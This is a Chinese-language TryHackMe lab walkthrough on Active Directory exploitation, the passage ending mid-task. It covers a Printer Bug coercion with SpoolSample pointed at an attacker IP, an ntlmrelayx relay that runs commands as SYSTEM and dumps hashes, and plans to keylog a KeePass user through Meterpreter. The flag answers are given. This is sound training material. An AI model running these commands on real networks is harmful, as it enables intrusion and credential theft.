<h2 class="anchor anchorWithStickyNavbar_LWe7" id="exploiting-automated-relays---利用自动中继">Exploiting Automated Relays - 利用自动中继<a href="#exploiting-automated-relays---利用自动中继" class="hash-link" aria-label="Exploiting Automated Relays - 利用自动中继的直接链接" title="Exploiting Automated Relays - 利用自动中继的直接链接">​</a></h2>
<p>在这个任务中，我们将看看一些自动继电器攻击。认证尝试不断在网络中传递，正如在渗透 AD 房间中所展示的，如果我们幸运的话，我们可以截取其中一些挑战以获取访问权限。但如果我们不想等待呢？如果我们能强迫进行认证呢？</p>
<p>尽管我们已经对 THMSERVER1 拥有了特权访问权限，但我们可能处于无法使用受限委派漏洞的位置。这是另一个可以用来获取主机特权访问权限的绝佳攻击手段。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="machine-账户">Machine 账户<a href="#machine-账户" class="hash-link" aria-label="Machine 账户的直接链接" title="Machine 账户的直接链接">​</a></h3>
<p>所有的 Windows 主机都有一个机器账户。本质上，这就是与机器关联的用户账户。除非有人篡改了主机的账户，否则这些账户的密码是无法破解的。默认情况下，它们有 120 个字符（UTF16）长，并且每 30 天自动更改一次。</p>
<p>在 AD 中，这些机器账户在不同的服务中被广泛使用。不同的域控制器使用它们的机器账户来同步 AD 的更新和更改。当你代表你正在操作的主机请求证书时，该主机的机器账户会用于认证到 AD 证书服务。</p>
<p>在 AD 中有一个特殊情况，一个机器具有另一台机器的管理员权限。本质上，在 AD 配置中，另一台主机被授予了对某台主机的管理权限。同样，这是预期的功能，比如必须同步的域控制器或 SQL 集群。然 而，这些情况为强迫认证提供了一个非常有趣的攻击向量。</p>
<p>我们首先需要确定一个机器账户是否具有对另一台机器的管理访问权限。我们可以使用 Bloodhound 来做这件事，但这意味着我们需要编写一些自定义的 Cypher 查询。在 Bloodhound 的 Analysis 标签中点击 &quot;Create Custom Query&quot;，我们想要编写以下查询：</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">MATCH p=(c1:Computer)-[r1:MemberOf*1..]-&gt;(g:Group)-[r2:AdminTo]-&gt;(n:Computer) RETURN p</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这个查询会尝试找到一个计算机在另一个计算机上具有 “AdminTo” 关系的情况。你应该会看到类似于这样的输出：</p>
<div style="text-align:center"><p><img loading="lazy" alt="Bloodhound 手动查询" src="/TryHackMe-CN/assets/images/image_20231235-183523-138ad175569542980963c1a18c7fdbcf.png" width="640" height="284" class="img_ev3q"></p></div>
<p>这非常有趣。它显示了 THMSERVER2 机器账户在 THMSERVER1 机器上具有管理权限。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-printer-bug---打印机错误">The Printer Bug - 打印机错误<a href="#the-printer-bug---打印机错误" class="hash-link" aria-label="The Printer Bug - 打印机错误的直接链接" title="The Printer Bug - 打印机错误的直接链接">​</a></h3>
<blockquote>
<p>“这不是一个漏洞，而是一个功能” — 微软</p>
<p>It&#x27;s not a bug, it&#x27;s a feature - Microsoft.</p>
</blockquote>
<p>严肃地说，当这个问题被报告时，微软回应称这是一个功能。打印机漏洞是 MS-RPRN 协议（打印系统远程协议）的 “功能”，它允许域用户远程强制目标主机上运行打印池服务的计算机账户对任意 IP 地址进行身份验证。在最近几年中出现了几个类似的漏洞：Spooler、PetitPotam、PrintNightmare。微软声称，唯一的问题是其中一些根本不需要 AD 凭据，但这个问题已经通过安全补丁解决了。</p>
<p>因此，要利用这个漏洞，除了机器账户的管理权限外，我们还需要满足以下四个条件：</p>
<ol>
<li>有效的 AD 账户凭据。</li>
<li>连接到目标 SMB 服务的网络连接。</li>
<li>目标主机必须运行打印池服务。</li>
<li>主机不能强制使用 SMB 签名。</li>
</ol>
<p>条件 1 和 2 已经满足。我们需要确保工作的是条件 3 和 4。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="print-spooler-service---打印后台处理服务">Print Spooler Service - 打印后台处理服务<a href="#print-spooler-service---打印后台处理服务" class="hash-link" aria-label="Print Spooler Service - 打印后台处理服务的直接链接" title="Print Spooler Service - 打印后台处理服务的直接链接">​</a></h3>
<p>我们需要确定打印池服务是否正在运行。由于我们无法访问 THMSERVER2，我们需要从网络角度进行查询。在这种情况下，我们可以使用 SSH 会话在 THMWRK1 上进行 WMI 查询来查询服务的当前状态：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">powershell</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\&gt; GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Location      :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name          : Microsoft XPS Document Writer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PrinterState  : 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PrinterStatus : 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ShareName     :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SystemName    : THMSERVER2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Location      :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name          : Microsoft Print to PDF</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PrinterState  : 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PrinterStatus : 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ShareName     :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SystemName    : THMSERVER2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这个命令的输出证实了该服务正在运行。如果出现访问被拒绝的错误，或许你可以尝试使用 PowerShell 命令 <code>Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc</code> 。然而，微软一直在限制从网络角度查看这些端口。如果两者都给你错误，也许你只需要冒险一试。因此，条件三已经满足。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="smb-signing---smb-签名">SMB Signing - SMB 签名<a href="#smb-signing---smb-签名" class="hash-link" aria-label="SMB Signing - SMB 签名的直接链接" title="SMB Signing - SMB 签名的直接链接">​</a></h3>
<p>为了中继强迫的身份验证尝试，SMB 签名不应该被强制。需要注意的是，SMB 签名被允许和 SMB 签名被强制是有区别的。由于一些旧系统不支持 SMB 签名，SMB 的默认配置是允许签名但不强制使用，这意味着只有在支持的情况下才会使用签名。由于我们将托管一个恶意的 SMB 服务器，我们可以确保我们的服务器不支持签名，从而强迫目标不对 SMB 身份验证尝试进行签名。</p>
<p>为了验证 THMSERVER1 和 THMSERVER2 是否没有强制使用 SMB 签名，我们可以在我们的 AttackBox 上使用 Nmap：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Terminal</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">thm@thm:~# nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nmap scan report for distributor.za.tryhackme.loc (172.31.1.201)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host is up (0.62s latency).</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PORT    STATE SERVICE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">445/tcp open  microsoft-ds</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host script results:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| smb2-security-mode:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   2.02:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|_    Message signing enabled but not required</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nmap scan report for 172.31.1.202</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host is up (0.38s latency).</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">PORT    STATE SERVICE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">445/tcp open  microsoft-ds</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host script results:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| smb2-security-mode:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|   2.02:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|_    Message signing enabled but not required</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Nmap done: 2 IP addresses (2 hosts up) scanned in 4.59 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>我们可以根据输出看到 SMB 签名已启用但未被强制。这意味着我们所有的条 件都已满足，我们可以开始攻击了！</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="exploiting-authentication-relays---利用身份验证中继">Exploiting Authentication Relays - 利用身份验证中继<a href="#exploiting-authentication-relays---利用身份验证中继" class="hash-link" aria-label="Exploiting Authentication Relays - 利用身份验证中继的直接链接" title="Exploiting Authentication Relays - 利用身份验证中继的直接链接">​</a></h3>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>提示</div><div class="admonitionContent_BuS1"><p>这种攻击可能不稳定。滥用打印池服务可能会导致其崩溃，并且不一定能收到回调。因此，前面的任务已经为您提供了继续进行的必要权限。但是，理解身份验证中继以及如何强制进行它们对于 AD 的利用至关重要。因此，以下提供了执行此类攻击的步骤。您可以尝试一下，但无法保证会回调。如果没有成功，请继续下一个任务，也许在完成您的房间旅程之后再来探索这个问题。</p></div></div>
<p>我们将使用 <a href="https://github.com/leechristensen/SpoolSample" target="_blank" rel="noopener noreferrer">SpoolSample</a> 来利用身份验证中继。这是一个 C# 的漏洞利用，但已经为您编译完成，并存储在 THMWRK1 的 <code>C:\Tools\</code> 目录中。我们将 使用 Spoolsample.exe 强制 THMSERVER2 向我们的 AttackBox 进行身份验证，然后使用 <a href="https://github.com/fortra/impacket" target="_blank" rel="noopener noreferrer">Impacket</a> 的 <a href="https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py" target="_blank" rel="noopener noreferrer">ntlmrelayx.py</a> 来中继身份验证尝试到 THMSERVER1。请注意，如果您正在使用自己的虚拟机，您需要确保拥有支持 SMBv2 的最新版本的 Impacket。</p>
<p>第一步是设置 NTLM 中继。在我们的 AttackBox 上，我们可以使用以下命令：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Terminal</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">thm@thm:~# python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://&quot;THMSERVER1 IP&quot; -debug</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>如果我们指定的是 THMSERVER1 的主机名而不是 IP，主机可能会要求我们使用 Kerberos 身份验证而不是 NTLM。因此，我们应该指定 IP。通过侦听中继，我们现在可以强制 THMSERVER2 对我们进行身份验证。在 THMWRK1 的 SSH 终端上执行以下操作：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Terminal</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Tools\&gt;SpoolSample.exe THMSERVER2.za.tryhackme.loc &quot;Attacker IP&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>你的攻击者 IP 应该与你的 tunX 接口对应于该网络。如果一切顺利，你应该已经收到了一个身份验证尝试并且成功中继到了 THMSERVER1。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Terminal</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">thm$ python3.9 ntlmrelayx.py -smb2support -t smb://&quot;THMSERVER1 IP&quot; -c &#x27;whoami /all&#x27; -debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Servers started, waiting for connections</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] SMBD-Thread-5: Received connection from 172.31.1.202, attacking target smb://172.31.1.201</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Authenticating against smb://172.31.1.201 as ZA/THMSERVER2$ SUCCEED</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] No more targets</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] SMBD-Thread-7: Connection from 172.31.1.202 controlled, but there are no more targets left!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] No more targets</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] SMBD-Thread-8: Connection from 172.31.1.202 controlled, but there are no more targets left!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Service RemoteRegistry is in stopped state</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Starting service RemoteRegistry</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] ExecuteRemote command: %COMSPEC% /Q /c echo whoami /all ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Executed specified command on host: 172.31.1.201</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">USER INFORMATION</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">----------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User Name           SID</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">=================== ========</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nt authority\system S-1-5-18</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">GROUP INFORMATION</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-----------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Group Name                             Type             SID          Attributes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">====================================== ================ ============ ==================================================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Mandatory Label\System Mandatory Level Label            S-1-16-16384</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[...]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这个输出类似于使用了 <code>-c &#x27;whoami /all&#x27;</code> 命令的情况。然而，通过不指定命令，你现在已经执行了一个哈希转储。这些凭据现在可以用来在主机上获取一个 Shell！</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>默认情况下，Windows 计算机帐户的密码多久轮换一次（以天为单位）？</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">30</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>如果我们想要中继 SMB 身份验证尝试，不应该强制执行哪些操作？</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SMB Signing</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>THMSERVER1 上 Administrator.ZA 用户的桌面目录中存储的标志的值是多少 (flag3.txt)？</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{Printing.Some.Shellz}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="exploiting-ad-users---利用-ad-用户">Exploiting AD Users - 利用 AD 用户<a href="#exploiting-ad-users---利用-ad-用户" class="hash-link" aria-label="Exploiting AD Users - 利用 AD 用户的直接链接" title="Exploiting AD Users - 利用 AD 用户的直接链接">​</a></h2>
<p>到目前为止，我们在利用方面已经取得了相当大的进展。我们对工作站和服务器拥有完全的管理员访问权限。基本上，我们可以对几乎任何一台一级和二级系统进行后期利用。但我们还想更进一步。接下来的任务也可以看作是后期利用，但在我们仍在执行利用以达到执行目标位置时，通常是一个极好的选择。现在是时候针对 AD 用户展开攻击了。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="用户和用户行为">用户和用户行为<a href="#用户和用户行为" class="hash-link" aria-label="用户和用户行为的直接链接" title="用户和用户行为的直接链接">​</a></h3>
<blockquote>
<p>未来的工厂只会有两名员工：一个人和一只狗。人的存在是为了喂狗，而狗则是为了在人试图触碰任何东西时咬人。- 沃伦 · 本尼斯</p>
<p>The factory of the future will only have two employees. A human and a dog. The human will be there to feed the dog. The dog will be there to bite the human if they try to touch something. - Warren Bennis</p>
</blockquote>
<p>用户往往是安全链条中最薄弱的环节。想想弱密码和不良习惯，比如授予过于宽松的权限。忽视这个攻击面是愚昧和无效的。虽然建立合适的 AD 用户枚举和攻击方法是有益的，但在这个任务中，我们将专注于两个要素：</p>
<ul>
<li>凭证管理 - 用户如何存储他们的凭证。在 AD 中，这非常重要，因为用户可能有多套凭证，记住它们可能很麻烦。</li>
<li>键盘记录 - 在利用过程中，我们经常需要了解普通用户如何与系统交互。与屏幕截图一起，键盘记录可以是从攻击者角度获取这种理解的有用工具。</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="寻找凭证">寻找凭证<a href="#寻找凭证" class="hash-link" aria-label="寻找凭证的直接链接" title="寻找凭证的直接链接">​</a></h3>
<p>现在我们已经入侵了 THMSERVER1，或许应该四处看看是否有任何有用的信息。查看用户目录，看看是否有一些有用的内容。</p>
<p>你的枚举工作应该会导致一个. kdbx 文件。快速搜索一下可以确认我们的怀疑，这个文件确实非常有价值！我们可以使用 Meterpreter 的下载命令来恢复这个文件。</p>
<p>这个文件似乎是一个凭证数据库。然而，问题在于数据库被密码加密了。我们可以尝试破解密码，但通常使用凭证数据库的人会确保初始密码是安全的。我们也许更有成功的机会是看看用户是如何与这个数据库进行交互的。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="system-有时特权太高">SYSTEM 有时特权太高<a href="#system-有 时特权太高" class="hash-link" aria-label="SYSTEM 有时特权太高的直接链接" title="SYSTEM 有时特权太高的直接链接">​</a></h3>
<p>Meterpreter 具有内置的键盘记录器。这对提取用户的击键信息很有用。但是，我们不能随便启动这个键盘记录器然后期待最好的结果，因为我们的 Shell 当前是在 SYSTEM 上下文中运行的。SYSTEM 不会输入任何按键，所以这对我们没有帮助。为了捕获正确用户的凭证，我们需要确保我们的 Shell 是以该用户的上下文运行的。</p>
<p>幸运的是，Meterpreter 提供了迁移功能，因为我们是以 SYSTEM 身份运行的，我们应该能够迁移到任何进程。你在 THMSERVER1 上具有远程代码执行权限，利用这个来获取一个 Meterpreter Shell。如果你需要关于如何使用 Meterpreter 和 Metasploit 的复习，这里有一个关于它使用的模块。不过，为了快速了解，你可以使用以下命令生成一个 PowerShell Meterpreter 载荷：</p>
